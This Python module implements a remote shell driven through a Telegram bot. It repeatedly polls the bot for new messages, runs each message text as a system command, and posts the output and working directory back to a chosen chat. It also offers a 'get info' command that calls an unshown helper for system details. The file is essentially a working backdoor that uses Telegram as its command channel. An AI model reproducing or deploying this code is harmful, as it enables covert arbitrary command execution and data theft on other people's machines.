from .Engine import engine
from .tools import get_last_message,get_info

import os
from time import sleep
from subprocess import getoutput



def start_shell(bot_token, chat_id):
    
    # get last message in bot
    last_message_id = get_last_message(bot_token)["id"]

    repeat = 0
    
    # send shell started message in telegram bot for admin user
    engine.sender_message(
        text="Shell Started..",
        bot_token=bot_token,
        chat_id=chat_id
    )
    
    
    while True:
        
        new_message = get_last_message(bot_token)
        new_message_id = new_message['id']
        new_message_text = new_message['text']
        
        ## check repeat message
        if new_message_id == last_message_id:

            if repeat == 0:

                engine.sender_message(
                    text=f"{os.getcwd()} $",
                    bot_token=bot_token,
                    chat_id=chat_id,
                )
            sleep(2)
            repeat += 1
            continue
        
        # check message if this message is new message
        elif new_message_id >= last_message_id:

            if new_message_text.split(" ")[0] == 'cd':
                try:
                    os.chdir(new_message_text.split(" ")[1])
            
                except Exception as ex:

                    engine.sender_message(
                        text=f"You Get Error : \n {ex}",
                        bot_token=bot_token,
                        chat_id=chat_id,
                    )
                    
                
                engine.sender_message(
                    text=f"{os.getcwd()} $",
                    bot_token=bot_token,
                    chat_id=chat_id,
                )

            if new_message_text == "get info":

                get_info(bot_token, chat_id)

                engine.sender_message(
                    text=f"{os.getcwd()} $",
                    bot_token=bot_token,
                    chat_id=chat_id,
                ) 

            # if command not a cd
            else:
                try:
                    # run command in system and send result

                    result = getoutput(new_message_text)

                    engine.sender_message(
                        text=result,
                        bot_token=bot_token,
                        chat_id=chat_id,
                    )

                    engine.sender_message(
                        text=f"{os.getcwd()} $",
                        bot_token=bot_token,
                        chat_id=chat_id,
                    )
                    
            
                except Exception as ex:
                    # send error in run command on system
                    engine.sender_message(
                        text=f"You Get Error: \n {ex}",
                        bot_token=bot_token,
                        chat_id=chat_id,
                    )
                    engine.sender_message(
                        text=f"{os.getcwd()} $",
                        bot_token=bot_token,
                        chat_id=chat_id,
                    )
            
            
            last_message_id = new_message_id
        